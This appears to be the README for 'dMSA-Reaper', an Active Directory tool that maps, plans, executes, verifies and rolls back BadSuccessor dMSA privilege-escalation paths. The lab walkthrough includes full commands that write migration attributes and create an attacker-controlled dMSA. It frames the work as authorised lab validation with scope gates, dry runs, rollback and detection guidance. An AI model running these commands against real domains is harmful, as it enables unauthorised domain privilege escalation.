# BadSuccessor and Ouroboros Validation Framework

dMSA-Reaper now exposes framework commands that sit above the existing
`map -> paths -> exploit -> verify -> rollback` lifecycle. They do not add new
LDAP write primitives, native Kerberos abuse, stealth, evasion, persistence, or
credential extraction.

## Validated Lab Lifecycle

```bash
dmsa-reaper doctor --domain dmsalab.local --dc-ip 192.168.56.10 \
  -u reaper.low -p '<password>'

dmsa-reaper map --domain dmsalab.local --dc-ip 192.168.56.10 \
  -u reaper.low -p '<password>' --json state.json

dmsa-reaper paths --state state.json --expand-targets \
  --only postpatch-mutual-pair --json paths.json

dmsa-reaper badsuccessor assess --state state.json --json

dmsa-reaper badsuccessor plan --state state.json --path P-0001 --json

dmsa-reaper badsuccessor execute --paths paths.json --path P-0001 \
  --scope scope.json --dry-run

# Take a lab snapshot before confirmed writes.

dmsa-reaper badsuccessor execute --state state.json --paths paths.json --path P-0001 \
  --scope scope.json --confirm --confirm-string dmsalab.local \
  --domain dmsalab.local --dc-ip 192.168.56.10 \
  -u reaper.low -p '<password>'

dmsa-reaper verify --op OP-... --mode ldap \
  --domain dmsalab.local --dc-ip 192.168.56.10 \
  -u reaper.low -p '<password>'

dmsa-reaper verify --op OP-... --mode external --evidence-file kerberos-dmsa-proof.json

dmsa-reaper rollback --op OP-... \
  --domain dmsalab.local --dc-ip 192.168.56.10 \
  -u reaper.low -p '<password>'
```

LDAP verification proves directory state only. It does not prove Kerberos ticket
issuance. Kerberos-side success must be recorded with structured,
operation-bound external evidence.

## Commands

### BadSuccessor

- `badsuccessor assess`: classifies BadSuccessor-capable paths and explains why
  each path is executable or blocked.
- `badsuccessor plan`: produces expected LDAP writes, proof requirements, and
  rollback steps without LDAP writes.
- `badsuccessor execute`: delegates to the existing `exploit` lifecycle and
  keeps the same scope, confirm string, operation log, and rollback gates.
- `badsuccessor verify`: runs LDAP or external proof verification and reports
  `ldap_verified`, `kerberos_base_verified`, `kerberos_dmsa_verified`, and
  `external_verified` separately.
- `badsuccessor report`: summarizes execution, proof state, rollback state,
  artifacts, and cleanup limits.

### Ouroboros

Ouroboros support is assessment-first. Native credential extraction and
automated secret retrieval are not implemented.

- `ouroboros assess`: checks dMSA migration capability, KDS, Server 2025 DC
  status, target sensitivity, unreadable dMSA state, and required proofs.
- `ouroboros plan`: produces LDAP transition and proof requirements without
  writes.
- `ouroboros simulate`: shows what proof would be required from fixtures/state
  only.
- `ouroboros verify`: accepts structured external proof only; base Kerberos
  proof does not mark dMSA/Ouroboros success.
- `ouroboros report`: summarizes assessment, proof state, cleanup state,
  limitations, and detection guidance.

## Proof Model

`kerberos-base-proof` records readiness only:

```json
{
  "type": "kerberos-base-proof",
  "operation_id": null,
  "principal": "reaper.low@DMSALAB.LOCAL",
  "service": "cifs/DMSA.dmsalab.local@DMSALAB.LOCAL",
  "tool": "smbclient.py",
  "result": "success",
  "notes": "SYSVOL listed successfully"
}
```

`kerberos-dmsa-proof` can set `verified_external=true` only while the operation
is active and the operation ID, target SAM, and created dMSA SAM match:

```json
{
  "type": "kerberos-dmsa-proof",
  "operation_id": "OP-...",
  "target_sam": "target.migrate",
  "created_dmsa_sam": "reaper-pwned-xxxxxx$",
  "tool": "external-verifier",
  "result": "success",
  "evidence": {
    "principal": "...",
    "service": "...",
    "timestamp": "..."
  }
}
```

The log records evidence hashes and sanitized summaries only. Raw tickets, NT
hashes, AES keys, private keys, passwords, session keys, and base64 ticket blobs
are rejected.

## Primitive Notes

- `postpatch-mutual-pair`: primary 2026 path. Creates a controlled dMSA and
  writes reciprocal dMSA-side and target-side migration attributes.
- `existing-dmsa-postpatch-mutual`: uses an existing controlled dMSA and writes
  both sides. Requires exact dMSA-side and target-side proof.
- `legacy-oneway-link` and `existing-dmsa-legacy-link`: lab/legacy only. They do
  not prove patched KDC behavior.
- DACL helper primitives: lab-unsafe by default and require scope plus explicit
  lab flags.

## Safe Lab Notes

- Keep sensitive targets hidden unless the lab explicitly requires
  `--include-sensitive-targets`.
- Use `--exclude-legacy` when validating patched post-BadSuccessor behavior.
- Use `--require-kerberos-ready` when path output should block on local cache,
  DNS, or skew problems.
- Always rollback active writes and verify rollback state.

## Troubleshooting

- Server 2025 LDAP signing or channel binding enforcement may require LDAPS and
  correct Schannel certificate selection.
- `ldap3` schema validation can reject newer attributes unless schema lookup is
  performed or name checking is disabled in targeted RootDSE/schema reads.
- KDS root key absence blocks real dMSA usability even when schema and ACLs are
  present.
- Unreadable existing dMSA attributes are reported as partial/unreadable state,
  not as a silent empty result.
- In Exegol, MIT krb5 tools may accept `KRB5CCNAME=FILE:/path/cache`; Impacket
  tools in the validated lab expected `KRB5CCNAME=/path/cache`.
